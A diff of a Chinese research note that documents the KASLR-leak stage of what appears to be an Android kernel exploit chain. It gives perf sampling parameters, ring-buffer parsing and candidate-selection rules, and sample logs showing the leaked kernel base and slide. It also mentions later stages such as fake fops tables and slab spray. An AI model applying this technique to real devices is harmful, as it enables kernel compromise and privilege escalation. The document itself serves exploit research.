@@ -1,81 +1,63 @@
-# 02. perf KASLR probe
+# 02. perf KASLR 采样与地址结论
 
-`rc_perf_leak_text_base()` 的任务是从当前启动的 perf IP sample 中推导 live kernel text base。它不把日志里的某个地址当成固定事实，也不使用跨设备常量；它只接受同一次采样窗口内满足聚类条件的候选页。
+## 摘要
 
-## perf_event_open 配置
+3.1 路径的第一段是 `rc_perf_leak_text_base()`。该函数通过 perf ring buffer 中的 kernel IP sample 选择 live kernel text base。本文只记录本轮实测可见的采样事实和源码中的选择规则。
 
-| 字段 | 当前值 | 作用 |
-| --- | --- | --- |
-| `type` | `PERF_TYPE_SOFTWARE` | 使用软件事件源 |
-| `config` | `PERF_COUNT_SW_CPU_CLOCK` | 以 CPU clock 产生高密度 sample |
-| `sample_period` | `1` | 尽量缩短 200 ms 窗口内的采样间隔 |
-| `sample_type` | `PERF_SAMPLE_IP` | ring 中只需要 IP |
-| `exclude_user` | `1` | 过滤用户态 IP |
-| `disabled` | `1` | mmap ring 后再 reset/enable |
-| mmap data pages | `RC_PERF_PAGES=8` | 1 个 metadata page + 8 个 data pages |
-
-默认采样窗口是 `PERF_PROBE_MSEC=200`。输入值小于 10 ms 或过大时会回退默认，并在日志里打印 `duration out of range`。
-
-## ring buffer 解析
-
-`rc_perf_collect()` 读取 metadata page 的 `data_head` / `data_tail`，按 `perf_event_header` 逐条推进 data ring：
-
-- `PERF_RECORD_SAMPLE`：读取 header 后的 8 字节 IP。
-- `PERF_RECORD_LOST`：累计 lost 计数，用来判断样本质量。
-- `misc & 7 == 1`：该 sample 计入 kernel sample。
-- IP 小于 `RC_PERF_MIN_BASE=0xffffffc008000000` 的样本不进入 text base 候选。
-- IP 用 `RC_PERF_PAGE_MASK=0xffffffffffe00000` 做 2 MiB 对齐归桶。
-- malformed record、越界 record、bucket 溢出都进入统计，不参与候选。
-
-有效日志会同时给出 ring 状态、样本范围和候选页：
+## 实测采样
 
 ```text
-[*] perf probe ring head=... tail=... records=... samples=... kernel=... lost=... malformed=...
-[*] perf probe sampled duration_ms=200 disable=0/0 min=... max=...
-[*] perf probe candidate page=... window=.../... near=... far=... buckets=...
-[+] perf probe text-base=... min_kip=... samples=...
-[+] slide-kaslr-perf-ok pid=... base=... slide=...
+[*] perf probe policy paranoid=-1
+[*] perf probe open fd=3 errno=0 attr_size=136
+[*] perf probe ring head=32752 tail=32752 records=2047 samples=2047 kernel=2047 lost=0 malformed=0
+[*] perf probe sampled duration_ms=200 disable=0/0 min=ffffffe778d67770 max=ffffffe77ba02c5c
+[*] perf probe candidate page=ffffffe779e00000 window=2044/2047 near=999 far=887 buckets=8
+[+] perf probe text-base=ffffffe779e00000 min_kip=ffffffe778d67770 samples=2047
+[+] slide-kaslr-perf-ok pid=23917 base=ffffffe779e00000 slide=0000002771e00000
+[*] timing stage=kaslr pid=23917 elapsed_ms=202
 ```
 
-参考日志里 `records=2047 samples=2047 kernel=2047 lost=0 malformed=0` 说明该次 ring 没有明显丢失或坏记录；`window=2044/2047` 表示候选窗口覆盖了绝大多数 kernel sample。
+## 方法
 
-## 候选页选择
+源码使用 `perf_event_open()` 建立短窗口采样：
 
-选择函数使用两层约束：
-
-1. 候选页 `pg` 必须存在明显样本桶，并且 `pg + RC_PERF_PAIR_DELTA` 也有相邻样本。当前 `RC_PERF_PAIR_DELTA=0x1c00000`。
-2. 从 `pg` 开始的 `RC_PERF_WINDOW=0x2000000` 覆盖窗口必须包含绝大多数 kernel samples；当前接受条件约等于 `best_window >= total - total / 4`。
-
-通过后，`pg` 被记为 `kaslr_base`，`kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE`。失败时常见日志是：
-
-```text
-[-] perf probe no usable kernel samples
-[-] perf probe rejected histogram best=... window=.../... buckets=...
-[-] perf probe text base out of range=...
-```
-
-## 地址换算边界
-
-perf probe 只解决 live text base。后续源码通过：
-
-```c
-return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
-```
-
-把 `target.h` 中的静态 image 地址换算成当前启动地址。它会影响 fake fops 表中的 CFI jump-table 入口、`init_task`、`sched` 相关静态对象和 restore 时的原始 `ashmem_fops` 地址。
-
-它不证明 mm/slab 碰撞成功，不证明 payload 已经落进目标页，也不证明 fops route 已经发生。KASLR 有效只是 3.1 证据链的第一段。
-
-## 诊断要点
-
-| 日志 | 判断 |
+| 字段 | 值 |
 | --- | --- |
-| `paranoid=-1` | perf 策略允许当前 shell 采样；其他值需结合 `open errno` 判断 |
-| `open retry ... attr_size=...` | 设备内核不接受初始 attr size，源码会降级重试 |
-| `lost > 0` | 采样压力过高或 ring 太小；候选仍可能有效，但证据质量下降 |
-| `malformed > 0` | ring 解析遇到坏记录；该次应谨慎处理 |
-| `buckets` 很少且 `window` 很集中 | 候选质量较好 |
-| `near/far` 都存在 | 符合 pair-delta 特征 |
-| `disable` errno 非 0 | 采样关闭阶段异常；保留日志，不要只看最后的 base |
+| `type` | `PERF_TYPE_SOFTWARE` |
+| `config` | `PERF_COUNT_SW_CPU_CLOCK` |
+| `sample_period` | `1` |
+| `sample_type` | `PERF_SAMPLE_IP` |
+| `exclude_user` | `1` |
+| `RC_PERF_PAGES` | `8` |
+| 默认窗口 | `PERF_PROBE_MSEC=200` |
 
-研究记录里建议保存完整 stdout，而不是只摘 `base` 和 `slide`。地址值会随启动变化；可复核的是采样数量、覆盖比例、候选选择过程和后续阶段是否与该 base 一致。
+ring 解析规则：
+
+| 规则 | 作用 |
+| --- | --- |
+| `PERF_RECORD_SAMPLE` 后读取 8 字节 IP | 取得候选样本 |
+| `misc & 7 == 1` | 只计 kernel sample |
+| `ip >= 0xffffffc008000000` | 过滤非 text 候选 |
+| `ip & 0xffffffffffe00000` | 2 MiB 页对齐归桶 |
+| 记录 `lost` 与 `malformed` | 作为样本质量凭证 |
+
+## 候选选择
+
+选择器接受 `ffffffe779e00000` 的原因是：
+
+| 条件 | 实测值 |
+| --- | --- |
+| ring 样本质量 | `2047/2047` 为 kernel sample，`lost=0`，`malformed=0` |
+| 候选窗口覆盖 | `window=2044/2047` |
+| 邻近桶特征 | `near=999`，`far=887` |
+| 桶数量 | `buckets=8` |
+| 输出 base | `base=ffffffe779e00000` |
+| 输出 slide | `slide=0000002771e00000` |
+
+该结论是单次启动内的 live base 结论。它不能外推为固定地址，也不能替代下一次启动的采样。
+
+## 后续地址使用边界
+
+当前源码在 `kaslr_done=1` 后使用 `text_addr()` 把 `target.h` 中的 image-relative 地址换算为本次启动地址。这个步骤只建立“后续计算使用同一个 base”的条件，不单独证明 mm/slab、payload、spray 或 route 已经成功。
+
+因此，KASLR 结论的终止表述是：本轮 perf 采样足以支持 3.1 路径继续执行，且本轮后续日志应与 `base=ffffffe779e00000`、`slide=0000002771e00000` 保持一致。
